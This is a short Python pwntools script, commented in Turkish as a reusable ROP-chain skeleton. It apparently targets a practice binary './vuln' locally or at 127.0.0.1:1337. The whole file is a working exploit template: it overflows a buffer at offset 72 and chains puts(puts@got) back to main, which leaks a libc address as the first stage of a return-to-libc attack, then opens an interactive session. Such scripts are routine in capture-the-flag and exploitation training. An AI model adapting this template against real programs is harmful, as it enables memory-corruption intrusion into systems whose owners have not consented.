#!/usr/bin/env python3
# Basit ROP zinciri iskeleti
# Bunu her binary için yeniden düzenlemek gerekiyor.

from pwn import *

context.binary = elf = ELF("./vuln", checksec=False)
context.log_level = "info"


def conn():
    if args.REMOTE:
        return remote("127.0.0.1", 1337)
    return process(elf.path)


io = conn()
rop = ROP(elf)

offset = 72  # cyclic ile kontrol et

# Örnek: puts(puts@got) -> main
chain = ROP(elf)
chain.call(elf.plt["puts"], [elf.got["puts"]])
chain.call(elf.symbols["main"])

payload = b"A" * offset + chain.chain()

log.info(chain.dump())
io.sendlineafter(b"> ", payload)

io.interactive()
